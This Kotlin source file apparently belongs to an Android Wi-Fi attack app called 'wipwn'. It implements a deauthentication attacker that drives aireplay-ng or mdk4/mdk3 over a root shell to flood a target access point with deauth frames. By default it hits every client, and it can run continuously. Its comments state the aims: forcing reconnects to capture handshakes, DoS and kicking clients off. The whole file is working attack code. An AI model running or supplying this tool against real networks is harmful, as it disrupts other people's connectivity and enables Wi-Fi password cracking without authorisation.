package com.wipwn.app.repository

import com.wipwn.app.data.WifiNetwork
import com.wipwn.app.util.ShellExecutor
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Deauthentication Attack module.
 *
 * Kirim deauth frames buat:
 * - Force client reconnect (buat capture handshake)
 * - DoS testing
 * - Client disconnection
 *
 * Butuh monitor mode aktif.
 */
class DeauthAttacker(
    private val shell: ShellExecutor,
    private val onLog: (stage: String, message: String) -> Unit
) {

    private val isRunning = AtomicBoolean(false)

    data class DeauthConfig(
        val count: Int = 0,           // 0 = continuous
        val intervalMs: Long = 100,
        val targetClient: String? = null, // null = broadcast (all clients)
        val reason: Int = 7           // deauth reason code
    )

    data class DeauthResult(
        val success: Boolean,
        val framesSent: Int,
        val duration: Long,
        val error: String? = null
    )

    /**
     * Run deauth attack.
     * Kalo count = 0, jalan terus sampe cancel() dipanggil.
     */
    suspend fun attack(
        monIface: String,
        targetBssid: String,
        config: DeauthConfig = DeauthConfig()
    ): DeauthResult {
        if (!isRunning.compareAndSet(false, true)) {
            return DeauthResult(false, 0, 0, "Deauth already running")
        }

        return withContext(Dispatchers.IO) {
            val startTime = System.currentTimeMillis()
            var framesSent = 0

            try {
                val client = config.targetClient ?: "FF:FF:FF:FF:FF:FF"
                onLog("deauth", "═══ Deauth Attack ═══")
                onLog("deauth", "Target AP  : $targetBssid")
                onLog("deauth", "Client     : $client")
                onLog("deauth", "Count      : ${if (config.count == 0) "continuous" else config.count.toString()}")

                // Check for available tools
                val hasAireplay = shell.exec("which aireplay-ng 2>/dev/null").isSuccess
                val hasMdk4 = shell.exec("which mdk4 2>/dev/null").isSuccess
                val hasMdk3 = shell.exec("which mdk3 2>/dev/null").isSuccess

                when {
                    hasAireplay -> {
                        onLog("deauth", "Using aireplay-ng")
                        if (config.count > 0) {
                            // Fixed count
                            val cmd = buildString {
                                append("aireplay-ng --deauth ${config.count} -a $targetBssid")
                                if (config.targetClient != null) append(" -c ${config.targetClient}")
                                append(" $monIface 2>&1")
                            }
                            val result = shell.exec(cmd)
                            framesSent = config.count
                            result.out.forEach { onLog("deauth", it) }
                        } else {
                            // Continuous
                            while (isRunning.get()) {
                                val cmd = buildString {
                                    append("aireplay-ng --deauth 10 -a $targetBssid")
                                    if (config.targetClient != null) append(" -c ${config.targetClient}")
                                    append(" $monIface 2>&1")
                                }
                                shell.exec(cmd)
                                framesSent += 10
                                onLog("deauth", "Sent $framesSent frames...")
                                delay(config.intervalMs)
                            }
                        }
                    }
                    hasMdk4 || hasMdk3 -> {
                        val tool = if (hasMdk4) "mdk4" else "mdk3"
                        onLog("deauth", "Using $tool")
                        shell.exec("echo '$targetBssid' > /tmp/wipwn_deauth.txt")

                        if (config.count > 0) {
                            shell.exec(
                                "timeout ${config.count / 10 + 5} $tool $monIface d -b /tmp/wipwn_deauth.txt 2>&1"
                            )
                            framesSent = config.count
                        } else {
                            // Continuous — run in background, stop on cancel
                            shell.exec("$tool $monIface d -b /tmp/wipwn_deauth.txt 2>&1 &")
                            while (isRunning.get()) {
                                framesSent += 10
                                delay(1000)
                                onLog("deauth", "Running... (~$framesSent frames)")
                            }
                            shell.exec("killall $tool 2>/dev/null")
                        }
                    }
                    else -> {
                        onLog("deauth", "No deauth tools found (need aireplay-ng or mdk4)")
                        return@withContext DeauthResult(
                            success = false,
                            framesSent = 0,
                            duration = System.currentTimeMillis() - startTime,
                            error = "No deauth tools installed. Install aircrack-ng or mdk4."
                        )
                    }
                }

                val duration = System.currentTimeMillis() - startTime
                onLog("deauth", "✓ Deauth complete: $framesSent frames in ${duration}ms")

                DeauthResult(
                    success = true,
                    framesSent = framesSent,
                    duration = duration
                )
            } catch (e: Exception) {
                onLog("deauth", "✗ Error: ${e.message}")
                DeauthResult(
                    success = false,
                    framesSent = framesSent,
                    duration = System.currentTimeMillis() - startTime,
                    error = e.message
                )
            } finally {
                isRunning.set(false)
            }
        }
    }

    /**
     * Stop continuous deauth.
     */
    fun cancel() {
        isRunning.set(false)
        shell.exec("killall aireplay-ng 2>/dev/null")
        shell.exec("killall mdk4 2>/dev/null")
        shell.exec("killall mdk3 2>/dev/null")
    }

    fun isActive(): Boolean = isRunning.get()
}
